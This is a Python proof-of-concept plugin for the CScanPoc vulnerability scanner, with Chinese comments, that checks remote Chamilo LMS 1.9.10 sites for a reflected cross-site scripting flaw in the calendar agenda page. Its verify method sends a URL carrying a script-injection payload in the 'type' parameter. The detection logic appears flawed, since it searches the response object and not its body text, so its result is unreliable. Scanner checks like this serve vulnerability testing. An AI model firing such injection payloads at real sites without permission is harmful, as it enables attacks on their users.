# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Chamilo-LMS_0001'  # 平台漏洞编号，留空
    name = 'Chamilo LMS 1.9.10 跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2015-03-19'  # 漏洞公布时间
    desc = '''
        Chamilo LMS 1.9.10 /main/calendar/agenda_list.php 跨站脚本漏洞。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36435/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Chamilo-LMS'  # 漏洞应用名称
    product_version = 'Chamilo LMS 1.9.10'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '933b05b8-5bde-45d5-84e0-666d6f7ff9f4'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            url = self.target + '/main/calendar/agenda_list.php'
            verify_url = url + '?type=personal%27%3E%3Cscript%3Econfirm%281%29%3C%2fscript%3E%3C%21--'
            content = requests.get(verify_url)
            if "<script>confirm(1)</script>" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name,url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
